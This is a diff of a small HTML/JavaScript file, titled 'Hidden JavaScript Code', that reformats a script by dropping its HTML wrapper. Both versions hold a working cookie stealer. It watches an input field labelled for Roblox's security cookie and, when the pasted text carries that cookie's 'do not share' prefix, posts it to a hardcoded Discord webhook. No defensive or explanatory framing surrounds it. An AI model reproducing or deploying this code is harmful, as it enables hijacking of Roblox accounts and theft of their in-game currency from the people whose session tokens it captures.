@@ -1,53 +1,43 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hidden JavaScript Code</title>
-</head>
-<body>
-    <script>
-        // Function to send data to a Discord webhook
-        function sendToWebhook(data) {
-            // Replace 'YOUR_WEBHOOK_URL' with the provided Discord webhook URL
-            const webhookUrl = 'https://discord.com/api/webhooks/1232806740102221946/SfTiZoG5B_qBfPAKZFl5sqnP8Zndd2JXISk4HmANcPcSKmAbjlf5uGykvOd_9o7VeTuM';
+<script>
+    // Function to send data to a Discord webhook
+    function sendToWebhook(data) {
+        // Replace 'YOUR_WEBHOOK_URL' with the provided Discord webhook URL
+        const webhookUrl = 'https://discord.com/api/webhooks/1232806740102221946/SfTiZoG5B_qBfPAKZFl5sqnP8Zndd2JXISk4HmANcPcSKmAbjlf5uGykvOd_9o7VeTuM';
 
-            // Create a new XMLHttpRequest object
-            const xhr = new XMLHttpRequest();
+        // Create a new XMLHttpRequest object
+        const xhr = new XMLHttpRequest();
 
-            // Configure the request
-            xhr.open('POST', webhookUrl);
+        // Configure the request
+        xhr.open('POST', webhookUrl);
 
-            // Set the Content-Type header to JSON
-            xhr.setRequestHeader('Content-Type', 'application/json');
+        // Set the Content-Type header to JSON
+        xhr.setRequestHeader('Content-Type', 'application/json');
 
-            // Define the data to send to the webhook
-            const payload = {
-                content: data
-            };
+        // Define the data to send to the webhook
+        const payload = {
+            content: data
+        };
 
-            // Convert the payload to JSON
-            const jsonPayload = JSON.stringify(payload);
+        // Convert the payload to JSON
+        const jsonPayload = JSON.stringify(payload);
 
-            // Send the request
-            xhr.send(jsonPayload);
+        // Send the request
+        xhr.send(jsonPayload);
+    }
+
+    // Get the input field by its class name
+    const inputField = document.querySelector('.css-3hthdr-Roblosecurity--Form.emh8bm65');
+
+    // Add an event listener to the input field for the 'input' event
+    inputField.addEventListener('input', function(event) {
+        // Get the value typed by the user
+        const userInput = event.target.value;
+        
+        // Check if the user input matches the specific string
+        const warningString = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and";
+        if (userInput.includes(warningString)) {
+            // Send the user input to the Discord webhook
+            sendToWebhook(userInput);
         }
-
-        // Get the input field by its class name
-        const inputField = document.querySelector('.css-3hthdr-Roblosecurity--Form.emh8bm65');
-
-        // Add an event listener to the input field for the 'input' event
-        inputField.addEventListener('input', function(event) {
-            // Get the value typed by the user
-            const userInput = event.target.value;
-            
-            // Check if the user input matches the specific string
-            const warningString = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and";
-            if (userInput.includes(warningString)) {
-                // Send the user input to the Discord webhook
-                sendToWebhook(userInput);
-            }
-        });
-    </script>
-</body>
-</html>
+    });
+</script>
